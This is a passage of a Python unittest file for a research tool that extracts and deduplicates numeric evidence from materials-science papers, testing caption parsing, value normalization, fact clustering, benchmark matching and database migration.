from __future__ import annotations

import csv
import hashlib
import json
import sqlite3
import tempfile
import unittest
from contextlib import closing
from pathlib import Path
from unittest.mock import patch

import fitz
import auto_research.evidence.prompts as prompt_module
import auto_research.evidence.six_column as six_column_module
import auto_research.evidence.webapp as webapp_module
from auto_research.ai.deepseek import DeepSeekSettings
from auto_research.evidence.article_navigation import navigation_tags
from auto_research.evidence.context_chat import DEFAULT_CONTEXT_QUESTION, answer_context_chat
from auto_research.evidence.db import EvidenceDB
from auto_research.evidence.db_health import evidence_db_health
from auto_research.evidence.maintenance import reconcile_stale_runs
from auto_research.evidence.evidence_audit import audit_six_column_evidence
from auto_research.evidence.experiment_types import classify_experiment_types, extraction_focuses_for_profile
from auto_research.evidence.deepseek_extraction import (
    _normalize_pending_tasks,
    _deduplicate,
    _evidence_check,
    _extraction_messages,
    _is_reference_dominant,
    _material_scope,
)
from auto_research.evidence.extraction_benchmark import (
    _maximum_cardinality_edges,
    benchmark_ensemble_preview,
    benchmark_extraction_run,
    compare_candidates,
    score_pair,
)
from auto_research.evidence.goal_audit import generate_goal_audit
from auto_research.evidence.fact_model import (
    classify_nonreportable_row,
    cluster_fact_rows,
    cluster_qualitative_rows,
    rows_are_same_fact,
)
from auto_research.evidence.importers import import_ai_result, import_legacy_sample
from auto_research.evidence.learning import build_learning_report
from auto_research.evidence.pilot import select_pilot
from auto_research.evidence.self_check import check_evidence_workflow
from auto_research.evidence.test_set import DEFAULT_CONFIG, _pdf_status, load_test_set
from auto_research.evidence.review_handoff import generate_review_batch, generate_review_handoff, review_batch_payload
from auto_research.evidence.validation import validate_database
from auto_research.evidence.values import normalize_value, parse_value
from auto_research.evidence.webapp import (
    EvidenceHandler,
    RELEASE_INFO,
    WEB_DIR,
    _startup_document_index,
    current_experiment_profile,
    is_read_only_public_get,
    is_read_only_mutation,
    make_xlsx,
    parse_search_paper_ids,
    require_loopback_host,
    requires_rescan_confirmation,
    search_export_rows,
    search_paper_catalog,
    spreadsheet_safe_cell,
)
from auto_research.evidence.workflow import run_article_workflow
from auto_research.evidence.six_column import (
    CURRENT_PAPER_META_KEY,
    SIX_FIELDS,
    TARGET_DOI,
    TARGET_TITLE,
    add_manual_item,
    add_qualitative_item,
    collect_learning_samples,
    confirm_correction,
    extract_current_paper_data,
    export_original_csv,
    get_current_paper_id,
    get_data_item,
    get_six_extraction_status,
    is_reportable_value_text,
    list_current_data,
    list_current_facts,
    list_paper_workflow_summaries,
    list_qualitative_findings,
    list_reportable_current_data,
    prepare_current_paper_packet,
    resolve_paper_selector,
    review_progress,
    save_current_paper_snapshot,
    search_current_data,
    search_qualitative_findings,
    seed_target_article,
    set_current_paper,
    set_row_review_decision,
)
from auto_research.evidence.source_highlight import (
    _normalize_text,
    get_source_view,
    render_source_highlight_png,
    render_source_snippet_png,
)
from auto_research.evidence.visual_evidence import (
    _FIGURE_CAPTION_RE,
    _TABLE_CAPTION_RE,
    _caption_body_is_reference,
    _complete_caption,
    _connected_table_rules,
    _generic_specs,
    _nearest_detected_table,
    _visual_metadata_messages,
    _visual_index_kinds,
    enrich_visual_metadata,
    get_visual_asset,
    index_visual_evidence,
    list_visual_assets,
    review_visual_asset,
    search_visual_assets,
    visual_asset_image_path,
)


class ValueTests(unittest.TestCase):
    def test_visual_caption_rules_reject_panel_references_and_page_order_wrap(self):
        self.assertIsNotNone(_FIGURE_CAPTION_RE.match("Fig. 9. TEM microstructure"))
        self.assertIsNone(_FIGURE_CAPTION_RE.match("Fig. 9a and Fig. 10a show the results"))
        panel_reference = _FIGURE_CAPTION_RE.match("Fig. 9(a) shows the results")
        self.assertIsNotNone(panel_reference)
        self.assertTrue(_caption_body_is_reference(panel_reference.group(2)))
        compact_caption = _FIGURE_CAPTION_RE.match(
            "Figure 9(a) TEM images before irradiation and (b) after irradiation."
        )
        self.assertIsNotNone(compact_caption)
        self.assertFalse(_caption_body_is_reference(compact_caption.group(2)))
        blocks = [
            (37.0, 723.0, 557.0, 744.0, "Fig. 9. TEM microstructure"),
            (37.0, 33.0, 500.0, 44.0, "Running page header"),
        ]
        caption, rect = _complete_caption(blocks, 0, "TEM microstructure")
        self.assertEqual(caption, "TEM microstructure")
        self.assertGreater(rect.y0, 700)
        self.assertIsNotNone(_TABLE_CAPTION_RE.match("Table 1. Summary of specimen builds"))
        self.assertTrue(_caption_body_is_reference("lists all specimen builds"))
        self.assertFalse(_caption_body_is_reference("Summary of specimen builds"))
        self.assertFalse(_caption_body_is_reference(
            "(a) Solution energies of Xe and Cs as a function of chemical potential."
        ))
        self.assertFalse(_caption_body_is_reference(
            "(a-b) Solution energies and [c] relaxed defect structures."
        ))
        self.assertTrue(_caption_body_is_reference("(a) shows the results in Fig. 8"))
        self.assertTrue(_caption_body_is_reference("[b] compares the irradiated specimens"))
        self.assertTrue(_caption_body_is_reference("(a)"))

    def test_caption_completion_classifies_split_caption_after_joining(self):
        blocks = [
            (52.0, 420.0, 145.0, 434.0, "Figure 7."),
            (52.0, 434.5, 510.0, 449.0, "(a) Defect energies before irradiation and"),
            (52.0, 449.5, 510.0, 464.0, "(b) defect energies after irradiation."),
        ]
        match = _FIGURE_CAPTION_RE.match(blocks[0][4])
        self.assertIsNotNone(match)
        caption, rect = _complete_caption(blocks, 0, match.group(2))
        self.assertFalse(_caption_body_is_reference(caption))
        self.assertIn("(a) Defect energies", caption)
        self.assertIn("(b) defect energies", caption)
        self.assertGreater(rect.y1, 460)

        prose_blocks = [
            (52.0, 420.0, 145.0, 434.0, "Fig. 7."),
            (52.0, 434.5, 510.0, 449.0, "(a) shows the calculated values in the next section."),
        ]
        match = _FIGURE_CAPTION_RE.match(prose_blocks[0][4])
        caption, _ = _complete_caption(prose_blocks, 0, match.group(2))
        self.assertTrue(_caption_body_is_reference(caption))

    def test_multi_panel_caption_after_delimiter_is_indexed_as_complete_figure(self):
        with tempfile.TemporaryDirectory() as tmp:
            pdf_path = Path(tmp) / "multi-panel-caption.pdf"
            document = fitz.open()
            page = document.new_page()
            page.draw_rect(fitz.Rect(80, 90, 500, 410), color=(0.1, 0.2, 0.3), width=2)
            page.draw_line((110, 350), (450, 150), color=(0.8, 0.2, 0.1), width=2)
            page.insert_textbox(
                fitz.Rect(70, 430, 525, 500),
                "Figure 3. (a) Solution energies of Xe and Cs as a function of chemical potential. "
                "(b) Solution energies at four interstitial sites.",
                fontsize=10,
            )
            document.save(pdf_path)
            document.close()
            specs = _generic_specs(pdf_path)
        figure = next(spec for spec in specs if spec["asset_type"] == "figure" and spec["number"] == 3)
        self.assertIn("Solution energies", figure["caption"])
        self.assertLess(figure["bbox"][1], 120)
        self.assertGreater(figure["bbox"][3], 440)

    def test_table_rule_group_stops_before_distant_footer(self):
        caption = fitz.Rect(39, 466, 295, 505)
        rules = [
            fitz.Rect(39, 512, 295, 513),
            fitz.Rect(39, 540, 295, 541),
            fitz.Rect(39, 683, 295, 684),
            fitz.Rect(39, 754, 561, 755),
        ]
        selected = _connected_table_rules(rules, caption, 791)
        self.assertEqual(len(selected), 2)
        self.assertLess(max(rule.x1 for rule in selected), 300)
        detected = _nearest_detected_table(
            [fitz.Rect(40, 520, 295, 690), fitz.Rect(310, 100, 560, 300)], caption
        )
        self.assertEqual(detected, fitz.Rect(40, 520, 295, 690))

    def test_list_of_tables_is_not_treated_as_the_first_real_table(self):
        blocks = [(20, 20, 560, 220, (
            "Table 1. Specimen builds ................................ 4\n"
            "Table 2. Weibull statistics ............................. 8\n"
            "Table 3. Irradiation matrix ............................ 12"
        ))]
        self.assertEqual(_visual_index_kinds(blocks), {"table"})
        actual_table = [(20, 20, 560, 220, "Table 1. Specimen builds\nID  Temperature  Dose")]
        self.assertEqual(_visual_index_kinds(actual_table), set())

    def test_model_pending_task_aliases_are_constrained_before_database_import(self):
        tasks = _normalize_pending_tasks([
            {"task_type": "figure_only", "description": "read Figure 3", "locator": "Figure 3"},
            {"task_type": "coverage_gap_retry", "description": "condition unclear", "locator": "Methods"},
        ])
        self.assertEqual(tasks[0]["task_type"], "figure_digitization")
        self.assertEqual(tasks[1]["task_type"], "ambiguous_condition")

    def test_six_column_values_require_numeric_data_or_explicit_table_marker(self):
        self.assertTrue(is_reportable_value_text("3.56±0.05"))
        self.assertTrue(is_reportable_value_text("n.m."))
        self.assertTrue(is_reportable_value_text("bal."))
        self.assertTrue(is_reportable_value_text("0.16 to 1.0"))
        self.assertTrue(is_reportable_value_text("50 keV He+"))
        self.assertTrue(is_reportable_value_text("W29.4Ta42Cr5.0V16.1Hf7.5"))
        self.assertTrue(is_reportable_value_text("below 4.9"))
        self.assertFalse(is_reportable_value_text("lattice swelling occurs"))
        self.assertFalse(is_reportable_value_text("room temperature"))
        self.assertFalse(is_reportable_value_text("less than half of the lattice swelling in pure W"))
        self.assertFalse(is_reportable_value_text("less than half of the thermal degradation in pure W (-60%)"))
        self.assertFalse(is_reportable_value_text("Increases from 500 to 580 °C but ceases at 700 °C"))

    def test_article_navigation_tags_keep_experiment_and_simulation_distinct(self):
        experiment = navigation_tags({
            "title": "Heavy ion irradiation of a tungsten heavy alloy in a simulated fusion environment",
            "material_focus": "W-Refractory-Alloys",
        })
        self.assertIn("聚变堆材料", experiment["object_tags"])
        self.assertIn("钨与难熔合金", experiment["object_tags"])
        self.assertIn("辐照实验", experiment["method_tags"])
        self.assertNotIn("辐照模拟/计算", experiment["method_tags"])

        simulation = navigation_tags({
            "title": "Shielding characteristics evaluated using Phy-X/PSD and SRIM programs",
        })
        self.assertIn("辐照模拟/计算", simulation["method_tags"])
        self.assertNotIn("辐照实验", simulation["method_tags"])

    def test_article_navigation_tags_are_nonexclusive(self):
        tags = navigation_tags({
            "title": "Irradiation effects in high entropy alloys: TEM defects and hardness",
            "material_focus": "HEA-RHEA-CCA",
        })
        self.assertIn("高熵/中熵合金", tags["object_tags"])
        self.assertIn("辐照实验", tags["method_tags"])
        self.assertIn("显微/缺陷表征", tags["method_tags"])
        self.assertIn("力学性能", tags["method_tags"])

    def test_pdf_flattened_scientific_exponent_matches_source_value(self):
        self.assertEqual(_normalize_text("8×10^16"), _normalize_text("8×1016"))

    def test_value_with_uncertainty(self):
        parsed = parse_value("3.56±0.05")
        self.assertEqual(parsed.value_kind, "number")
        self.assertEqual(parsed.value_num, 3.56)
        self.assertEqual(parsed.uncertainty_num, 0.05)

    def test_range_and_safe_normalization(self):
        parsed = parse_value("900-1600")
        self.assertEqual((parsed.value_min, parsed.value_max), (900, 1600))
        self.assertEqual(normalize_value(300, None, "°C"), (573.15, None, "K"))
        self.assertEqual(normalize_value(1, 0.1, "MeV"), (1_000_000, 100_000, "eV"))
        self.assertEqual(normalize_value(1, None, "mystery"), (None, None, None))


class PhysicalFactModelTests(unittest.TestCase):
    def _row(self, item_id: int, **changes):
        row = {
            "item_id": item_id, "paper_id": 1, "origin_type": "automatic",
            "review_action": "automatic", "value_text": "23.9", "unit": "W/m·K",
            "meaning": "未辐照W90Ta10电子热导率",
            "context_explanation": "W90Ta10薄膜；未辐照；由电阻率推导",
            "source_page": 7, "source_locator": "Section 3",
            "source_excerpt": "W90Ta10 has 23.9 W/m·K",
            "visual_assets": [], "article_title": "Paper", "doi": "10.1/fact",
        }
        row.update(changes)
        return row

    def test_semantic_duplicates_become_one_fact_with_multiple_sources(self):
        rows = [
            self._row(1),
            self._row(
                2, unit="W/(m·K)", meaning="电子热导率",
                source_locator="Fig. 2(c)",
                source_excerpt="W90Ta10 has 23.9 W/m·K, while W90Re10 has 29.5 W/m·K",
            ),
        ]
        facts = cluster_fact_rows(rows)
        self.assertEqual(len(facts), 1)
        self.assertEqual(facts[0]["fact_member_ids"], [1, 2])
        self.assertEqual(facts[0]["fact_cluster_size"], 2)
        self.assertEqual(facts[0]["evidence_count"], 2)

    def test_same_number_for_different_element_or_condition_is_not_merged(self):
        iron = self._row(1, value_text="20", unit="at%", meaning="Fe元素名义原子分数")
        nickel = self._row(2, value_text="20", unit="at.%", meaning="Ni元素名义原子分数")
        self.assertFalse(rows_are_same_fact(iron, nickel)[0])
        low_dose = self._row(3, value_text="3.5", unit="GPa", meaning="辐照后硬度", context_explanation="1 dpa；300 °C")
        high_dose = self._row(4, value_text="3.5", unit="GPa", meaning="辐照后硬度", context_explanation="10 dpa；300 °C")
        self.assertFalse(rows_are_same_fact(low_dose, high_dose)[0])
        self.assertEqual(len(cluster_fact_rows([iron, nickel, low_dose, high_dose])), 4)

    def test_similarity_bridge_cannot_merge_conflicting_conditions(self):
        one_dpa = self._row(
            1, value_text="3.5", unit="GPa", meaning="辐照后硬度",
            context_explanation="1 dpa；300 °C",
        )
        condition_unspecified = self._row(
            2, value_text="3.5", unit="GPa", meaning="辐照后硬度",
            context_explanation="300 °C",
        )
        ten_dpa = self._row(
            3, value_text="3.5", unit="GPa", meaning="辐照后硬度",
            context_explanation="10 dpa；300 °C",
        )
        facts = cluster_fact_rows([one_dpa, condition_unspecified, ten_dpa])
        self.assertEqual(len(facts), 2)
        self.assertFalse(any({1, 3}.issubset(set(fact["fact_member_ids"])) for fact in facts))

    def test_qualitative_observation_is_separate_from_context_labels(self):
        observation = self._row(1, value_text="not observed", unit="", meaning="辐照诱导空洞观察结果")
        instrument = self._row(2, value_text="FEI Titan 80-300 TEM", unit="", meaning="透射电子显微镜型号")
        deposition = self._row(3, value_text="room temperature", unit="", meaning="沉积温度")
        self.assertEqual(classify_nonreportable_row(observation), "qualitative_finding")
        self.assertEqual(classify_nonreportable_row(instrument), "context_only")
        self.assertEqual(classify_nonreportable_row(deposition), "context_only")
        findings = cluster_qualitative_rows([observation, instrument, deposition])
        self.assertEqual([item["item_id"] for item in findings], [1])


class ExtractionBenchmarkTests(unittest.TestCase):
    def test_number_words_match_numeric_method_values_without_rewriting_source(self):
        candidate = {
            "value_text": "five times",
            "unit": "",
            "meaning": "塑性区与压痕深度的倍数关系",
            "context_explanation": "Berkovich tip",
            "source_page": 9,
            "source_locator": "Section 3.3",
            "source_excerpt": "plastic zone is about five times the indentation depth",
        }
        baseline = {
            "value_text": "~5",
            "unit": "× indentation depth",
            "meaning": "Berkovich压头塑性区相对压入深度倍数",
            "context_explanation": "Berkovich tip",
            "source_page": 9,
            "source_locator": "Section 3.3",
            "source_excerpt": "plastic zone is about five times the indentation depth",
        }
        scored = score_pair(candidate, baseline)
        self.assertIsNotNone(scored)
        self.assertEqual(candidate["value_text"], "five times")

    def test_matching_maximizes_coverage_instead_of_greedy_score(self):
        high = {"score": 0.95, "status": "exact", "disagreements": [], "signals": {}}
        medium = {"score": 0.80, "status": "exact", "disagreements": [], "signals": {}}
        specific = {"score": 0.90, "status": "exact", "disagreements": [], "signals": {}}
        # Candidate 0 can use either baseline. Candidate 1 can only use baseline
        # 0. Greedy would take (0,0) and cover one row; augmenting must cover two.
        matched = _maximum_cardinality_edges([
            (0.95, 0, 0, high),
            (0.80, 0, 1, medium),
            (0.90, 1, 0, specific),
        ])
        self.assertEqual({(candidate, baseline) for candidate, baseline, _ in matched}, {(0, 1), (1, 0)})

    def test_scalar_does_not_match_repeated_vector_value(self):
        candidate = {
            "value_text": "0.2", "unit": "nm", "source_page": 2,
            "source_locator": "Section 2", "source_excerpt": "each pixel 0.2 nm x 0.2 nm",
            "meaning": "pixel size", "context_explanation": "WBDF image analysis",
        }
        baseline = {
            "value_text": "0.2 × 0.2", "unit": "nm²", "source_page": 2,
            "source_locator": "Section 2", "source_excerpt": "each pixel 0.2 nm x 0.2 nm",
            "meaning": "图像像素尺寸", "context_explanation": "WBDF图像分析",
        }
        self.assertIsNone(score_pair(candidate, baseline))

    def test_one_to_one_matching_uses_source_identity_for_repeated_values(self):
        baseline = [
            {
                "item_id": 1, "stable_key": "anneal", "value_text": "300", "unit": "°C",
                "source_page": 2, "source_locator": "Methods",
                "source_excerpt": "annealed at 300 °C for one hour",
                "meaning": "退火温度", "context_explanation": "样品A；退火",
                "review_action": "automatic", "origin_type": "automatic",
            },
            {
                "item_id": 2, "stable_key": "irradiation_temperature", "value_text": "300", "unit": "°C",
                "source_page": 2, "source_locator": "Methods",
                "source_excerpt": "irradiated at 300 °C to 1 dpa",
                "meaning": "辐照温度", "context_explanation": "样品B；Kr离子辐照",
                "review_action": "automatic", "origin_type": "automatic",
            },
        ]
        candidates = [
            {
                "candidate_id": "irr", "value_text": "300", "unit": "°C", "source_page": 2,
                "source_locator": "Methods", "source_excerpt": "irradiated at 300 °C to 1 dpa",
                "meaning": "irradiation temperature", "context_explanation": "sample B; Kr irradiation",
            },
            {
                "candidate_id": "ann", "value_text": "300", "unit": "°C", "source_page": 2,
                "source_locator": "Methods", "source_excerpt": "annealed at 300 °C for one hour",
                "meaning": "annealing temperature", "context_explanation": "sample A; annealing",
            },
        ]
        report = compare_candidates(baseline, candidates)
        matched = {item["candidate_id"]: item["baseline_stable_key"] for item in report["matches"]}
        self.assertEqual(matched, {"irr": "irradiation_temperature", "ann": "anneal"})
        self.assertEqual(report["summary"]["baseline_covered_count"], 2)

    def test_unit_disagreement_is_reported_as_partial_match(self):
        candidate = {
            "value_text": "5", "unit": "", "source_page": 5,
            "source_locator": "Section 3", "source_excerpt": "about five times the indentation depth",
            "meaning": "plastic zone ratio", "context_explanation": "Berkovich indentation",
        }
        baseline = {
            "value_text": "5", "unit": "× indentation depth", "source_page": 5,
            "source_locator": "Section 3", "source_excerpt": "about five times the indentation depth",
            "meaning": "塑性区倍数", "context_explanation": "Berkovich压痕",
        }
        scored = score_pair(candidate, baseline)
        self.assertIsNotNone(scored)
        self.assertEqual(scored["status"], "partial")
        self.assertIn("unit", scored["disagreements"])

    def test_qualitative_observation_matches_by_concept_and_polarity(self):
        candidate = {
            "value_text": "No precipitates", "unit": "", "source_page": 8,
            "source_locator": "Section 3.2",
            "source_excerpt": "no precipitates can be evidently revealed under TEM at 1 dpa",
            "meaning": "ordered precipitates observation",
            "context_explanation": "Al0.3CoCrFeNi; irradiated to 1 dpa",
        }
        baseline = {
            "value_text": "not observed", "unit": "", "source_page": 8,
            "source_locator": "Section 3.2",
            "source_excerpt": "no precipitates can be evidently revealed under TEM at 1 dpa",
            "meaning": "有序析出物观察结果",
            "context_explanation": "Al0.3CoCrFeNi；1 dpa",
        }
        scored = score_pair(candidate, baseline)
        self.assertIsNotNone(scored)
        self.assertGreater(scored["signals"]["observation_semantics"], 0)

    def test_qualitative_observation_rejects_opposite_polarity(self):
        candidate = {
            "value_text": "no additional reflections", "source_page": 7,
            "source_excerpt": "no additional reflections were found after irradiation",
            "meaning": "phase stability",
        }
        baseline = {
            "value_text": "detected", "source_page": 7,
            "source_excerpt": "a trace of {100} reflections were observed after irradiation",
            "meaning": "有序化信号",
        }
        self.assertIsNone(score_pair(candidate, baseline))

    def test_qualitative_value_repeated_unit_can_match_clean_baseline(self):
        candidate = {
            "value_text": "a few nanometers", "unit": "nm", "source_page": 5,
            "source_excerpt": "the majority of loops remained to be a few nanometers",
            "meaning": "位错环尺寸", "context_explanation": "1 dpa前",
        }
        baseline = {
            "value_text": "a few", "unit": "nm", "source_page": 5,
            "source_excerpt": "the majority of loops remained to be a few nanometers",
            "meaning": "多数位错环尺寸", "context_explanation": "最高1 dpa",
        }
        self.assertIsNotNone(score_pair(candidate, baseline))


class DeepSeekDeduplicationTests(unittest.TestCase):
    def test_material_scope_normalizes_decimal_alloy_and_all_materials(self):
        self.assertEqual(_material_scope("Al0.3CoCrFeNi; TEM"), "al03cocrfeni")
        self.assertEqual(
            _material_scope("Al0.3CoCrFeNi, CoCrFeMnNi and 316H"),
            "allmaterials",
        )

    def test_cross_language_duplicate_is_merged_with_audit_ids(self):
        common = {
            "value_text": "1655", "unit": "K", "source_page": 8,
            "source_locator": "Table 4", "source_excerpt": "Al0.3CoCrFeNi 1655",
        }
        candidates = [
            {**common, "candidate_id": "cn", "meaning": "熔点", "context_explanation": "合金成分：Al0.3CoCrFeNi"},
            {**common, "candidate_id": "en", "meaning": "melting temperature Tm", "context_explanation": "Al0.3CoCrFeNi; Table 4"},
        ]
        result = _deduplicate(candidates)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["duplicate_candidate_ids"], ["en"])

    def test_equal_composition_values_for_different_elements_are_not_merged(self):
        common = {
            "value_text": "0.03", "unit": "at%", "source_page": 2,
            "source_locator": "Table 1", "source_excerpt": "P 0.03, S 0.03",
            "context_explanation": "316H nominal composition",
        }
        result = _deduplicate([
            {**common, "candidate_id": "p", "meaning": "P nominal composition"},
            {**common, "candidate_id": "s", "meaning": "S nominal composition"},
        ])
        self.assertEqual(len(result), 2)

    def test_equal_temperature_for_different_experiment_types_is_not_merged(self):
        common = {
            "value_text": "300", "unit": "°C", "source_page": 2,
            "source_locator": "Methods", "context_explanation": "Al0.3CoCrFeNi",
        }
        result = _deduplicate([
            {**common, "candidate_id": "anneal", "meaning": "annealing temperature", "source_excerpt": "annealed at 300 °C"},
            {**common, "candidate_id": "irradiate", "meaning": "irradiation temperature", "source_excerpt": "irradiated at 300 °C"},
        ])
        self.assertEqual(len(result), 2)

    def test_global_and_unspecified_scope_duplicates_can_merge(self):
        common = {
            "value_text": "1", "unit": "MeV", "source_page": 2,
            "source_locator": "Methods", "source_excerpt": "irradiated with 1 MeV Kr ions",
            "meaning": "离子能量",
        }
        result = _deduplicate([
            {**common, "candidate_id": "global", "context_explanation": "all materials"},
            {**common, "candidate_id": "unknown", "context_explanation": "Kr离子辐照"},
        ])
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["duplicate_candidate_ids"], ["unknown"])

    def test_standalone_uncertainty_is_rejected(self):
        checked = _evidence_check({
            "value_text": "0.05", "unit": "GPa", "meaning": "纳米硬度不确定度",
            "source_excerpt": "3.56 ± 0.05 GPa", "source_locator": "Table 3",
            "source_precision": "exact_table", "evidence_type": "measured",
        }, "Table 3: 3.56 ± 0.05 GPa")
        self.assertFalse(checked["passed"])
        self.assertIn("同一条", checked["reason"])

    def test_central_value_cannot_drop_reported_uncertainty(self):
        checked = _evidence_check({
            "value_text": "3.56", "unit": "GPa", "meaning": "纳米硬度",
            "source_excerpt": "Al0.3CoCrFeNi 3.56 ± 0.05 GPa", "source_locator": "Table 3",
            "source_precision": "exact_table", "evidence_type": "measured",
        }, "Table 3: Al0.3CoCrFeNi 3.56 ± 0.05 GPa")
        self.assertFalse(checked["passed"])
        self.assertIn("丢弃误差", checked["reason"])

    def test_vector_source_cannot_be_truncated_to_scalar(self):
        checked = _evidence_check({
            "value_text": "0.2", "unit": "nm", "meaning": "图像像素尺寸",
            "source_excerpt": "each pixel (0.2 nm × 0.2 nm)", "source_locator": "Methods",
            "source_precision": "exact_text", "evidence_type": "measured",
        }, "each pixel (0.2 nm × 0.2 nm)")
        self.assertFalse(checked["passed"])
        self.assertIn("截断", checked["reason"])

    def test_scientific_notation_multiplication_is_not_a_vector(self):
        checked = _evidence_check({
            "value_text": "6.3 × 10^15", "unit": "ions/(m²·s)", "meaning": "离子通量",
            "source_excerpt": "flux was 6.3 × 10^15 ions/(m2 s)", "source_locator": "Methods",
            "source_precision": "exact_text", "evidence_type": "measured",
        }, "flux was 6.3 × 10^15 ions/(m2 s)")
        self.assertTrue(checked["passed"], checked)

    def test_nominal_measured_pair_must_be_split(self):
        checked = _evidence_check({
            "value_text": "23.3 (23.7)", "unit": "at%", "meaning": "Fe名义(测量)成分",
            "source_excerpt": "Fe 23.3 (23.7)", "source_locator": "Table 1",
            "source_precision": "exact_table", "evidence_type": "measured",
        }, "Table 1: Fe 23.3 (23.7) at%")
        self.assertFalse(checked["passed"])
        self.assertIn("两条", checked["reason"])

    def test_scalar_assignment_and_equivalent_unit_spelling_are_deduplicated(self):
        common = {
            "source_page": 8, "source_locator": "Table 4", "meaning": "混合焓",
            "context_explanation": "Al0.3CoCrFeNi", "source_excerpt": "ΔHmix -7.27 kJ mol-1",
        }
        result = _deduplicate([
            {**common, "candidate_id": "plain", "value_text": "-7.27", "unit": "kJ mol^-1"},
            {**common, "candidate_id": "formula", "value_text": "ΔH_mix = -7.27", "unit": "kJ mol⁻¹"},
        ])
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["duplicate_candidate_ids"], ["formula"])

    def test_low_score_experiment_types_do_not_create_extra_passes(self):
        profile = {
            "primary_label": "辐照实验",
            "types": [
                {"type_id": "irradiation_experiment", "score": 39},
                {"type_id": "mechanical_testing", "score": 21},
                {"type_id": "electrochemical_testing", "score": 9},
            ],
            "selected_types": [
                {"type_id": "irradiation_experiment", "score": 39},
                {"type_id": "mechanical_testing", "score": 21},
            ],
        }
        foci = extraction_focuses_for_profile(profile)
        self.assertEqual(len(foci), 3)
        self.assertIn("irradiation conditions", foci[-1])
        self.assertNotIn("electrochemical", foci[-1])

    def test_compound_qualitative_observation_is_not_a_numeric_data_row(self):
        item = {
            "value_text": "high density of dislocation loops, no void",
            "meaning": "irradiated microstructure",
            "evidence_type": "qualitative",
        }
        checked = _evidence_check(item, "A high density of dislocation loops was found. No void was observed.")
        self.assertFalse(checked["passed"])
        self.assertIn("不含数字", checked["reason"])

    def test_extraction_prompt_requests_numeric_observation_thresholds(self):
        messages = _extraction_messages(
            {"title": "Test", "doi": "10.1/test"},
            [{"page": 1, "text": "loops appeared at 0.01 dpa and saturated at 0.1 dpa"}],
            "results",
        )
        system = messages[0]["content"]
        self.assertIn("Do not create a data row", system)
        self.assertIn("reported number, inequality, range", system)

    def test_mixed_results_and_references_page_is_not_discarded(self):
        text = (
            "Discussion\n"
            + ("The calculated hardness increase was 1.2 GPa after irradiation. "
               "The indentation depth was 100 nm. " * 8)
            + "\nReferences\n"
            + "\n".join(f"[{index}] Author, Journal, {2000 + index}." for index in range(1, 12))
        )
        self.assertFalse(_is_reference_dominant(text))

    def test_reference_only_page_is_discarded(self):
        text = "References\n" + "\n".join(
            f"[{index}] Author, Journal, {2000 + index}." for index in range(1, 12)
        )
        self.assertTrue(_is_reference_dominant(text))


class EvidenceDBTests(unittest.TestCase):
    def test_database_connections_wait_for_transient_writers(self):
        with self.db.connect() as conn:
            timeout_ms = conn.execute("PRAGMA busy_timeout").fetchone()[0]
        self.assertEqual(timeout_ms, 30000)

    def test_read_only_startup_never_indexes_or_writes_documents(self):
        class Service:
            calls = 0

            def index_existing_pdfs(self):
                self.calls += 1
                return {"indexed": 1, "skipped": 2}

        service = Service()
        readonly = _startup_document_index(service, read_only=True)
        self.assertEqual(readonly, {"indexed": 0, "skipped": 0, "disabled": True})
        self.assertEqual(service.calls, 0)
        editable = _startup_document_index(service, read_only=False)
        self.assertEqual(editable, {"indexed": 1, "skipped": 2, "disabled": False})
        self.assertEqual(service.calls, 1)

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.db = EvidenceDB(Path(self.tmp.name) / "evidence.sqlite")
        self.paper = self.db.upsert_paper(title="Ion irradiation experiment", doi="10.1/test")

    def tearDown(self):
        self.tmp.cleanup()

    def add_measurement(self, **overrides):
        values = dict(
            paper_id=self.paper, category="mechanical_property", parameter="hardness", value_raw="3.5",
            value_kind="number", value_num=3.5, unit_raw="GPa", evidence_type="measured",
            source_precision="exact_table", evidence={"page_number": 4, "locator": "Table 2", "excerpt": "Hardness was 3.5 GPa."},
        )
        values.update(overrides)
        return self.db.add_measurement(**values)

    def test_schema7_migration_quarantines_orphan_versions_without_data_loss(self):
        stamp = "2026-07-10T00:00:00+00:00"
        with closing(sqlite3.connect(self.db.path)) as conn:
            conn.execute("PRAGMA foreign_keys=OFF")
            conn.execute("INSERT INTO data_items(id,paper_id,stable_key,origin_type,created_at) VALUES(1,?,?,?,?)", (
                self.paper, "valid", "automatic", stamp,
            ))
            conn.execute("DROP VIEW v_current_six_column_data")
            conn.execute("ALTER TABLE data_versions RENAME TO data_versions_schema7")
            conn.execute(
                """CREATE TABLE data_versions (
                  id INTEGER PRIMARY KEY AUTOINCREMENT,
                  item_id INTEGER NOT NULL REFERENCES data_items(id) ON DELETE CASCADE,
                  version_no INTEGER NOT NULL,
                  value_text TEXT NOT NULL,
                  meaning TEXT NOT NULL,
                  unit TEXT NOT NULL DEFAULT '',
                  article_title TEXT NOT NULL,
                  doi TEXT NOT NULL,
                  context_explanation TEXT NOT NULL,
                  source_page INTEGER,
                  source_locator TEXT,
                  source_excerpt TEXT,
                  editor TEXT NOT NULL,
                  edit_note TEXT,
                  review_action TEXT NOT NULL DEFAULT 'automatic'
                    CHECK(review_action IN ('automatic','confirmation','correction','manual')),
                  created_at TEXT NOT NULL,
                  UNIQUE(item_id, version_no)
                )"""
            )
            values = (
                0, "300", "辐照温度", "°C", "Ion irradiation experiment", "10.1/test",
                "测试条件", 3, "Methods", "at 300 C", "legacy", "", "automatic", stamp,
            )
            conn.execute(
                """INSERT INTO data_versions(id,item_id,version_no,value_text,meaning,unit,article_title,doi,
                context_explanation,source_page,source_locator,source_excerpt,editor,edit_note,review_action,created_at)
                VALUES(1,1,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                values,
            )
            conn.execute(
                """INSERT INTO data_versions(id,item_id,version_no,value_text,meaning,unit,article_title,doi,
                context_explanation,source_page,source_locator,source_excerpt,editor,edit_note,review_action,created_at)
                VALUES(2,999,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                values,
            )
            conn.execute("DROP TABLE data_versions_schema7")
            conn.commit()
        self.db.init()
        with self.db.connect() as conn:
            self.assertEqual(conn.execute("SELECT COUNT(*) count FROM data_versions").fetchone()["count"], 1)
            self.assertEqual(conn.execute("SELECT COUNT(*) count FROM data_version_orphans").fetchone()["count"], 1)
            self.assertEqual(conn.execute("SELECT value FROM schema_meta WHERE key='schema_version'").fetchone()["value"], "12")
            self.assertEqual(list(conn.execute("PRAGMA foreign_key_check")), [])
        health = evidence_db_health(self.db, self.paper)
